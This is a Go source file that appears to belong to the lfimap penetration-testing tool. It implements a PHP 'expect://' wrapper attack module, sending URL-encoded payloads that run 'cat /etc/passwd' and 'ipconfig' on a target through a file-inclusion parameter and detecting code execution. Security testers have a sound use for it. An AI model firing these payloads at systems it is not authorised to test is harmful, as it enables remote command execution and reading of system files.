package attacks

import (
	"fmt"

	lfihttp "github.com/hansmach1ne/lfimap/internal/http"
)

// ExpectAttack implements PHP expect wrapper attack
type ExpectAttack struct{}

// Name returns the attack name
func (a *ExpectAttack) Name() string {
	return "expect"
}

// Test executes the expect wrapper attack
func (a *ExpectAttack) Test(ctx *AttackContext, targetURL, postData string) bool {
	if ctx.Verbose {
		fmt.Printf("%s Testing with expect wrapper...\n", ctx.Colors.Blue("[i]"))
	}

	tests := []string{
		"expect%3A%2F%2Fcat%20%2Fetc%2Fpasswd",
		"expect%3A%2F%2Fipconfig",
	}

	placeholder := ctx.Config.Args.Placeholder
	headers := lfihttp.HeadersToMap(lfihttp.InitHeaders(
		ctx.Config.Args.UserAgent,
		ctx.Config.Args.Referer,
		ctx.Config.Args.Cookie,
	))

	for i, test := range tests {
		u, reqHeaders, postTest := lfihttp.PrepareRequest(placeholder, test, targetURL, postData, headers, ctx.Encodings)
		result := lfihttp.Request(ctx.HTTPCtx, u, reqHeaders, postTest, "RCE", "EXPECT", false, false, false)

		if !result.DoContinue {
			return true
		}

		if i == 1 && ctx.Quick {
			return false
		}
	}

	return false
}
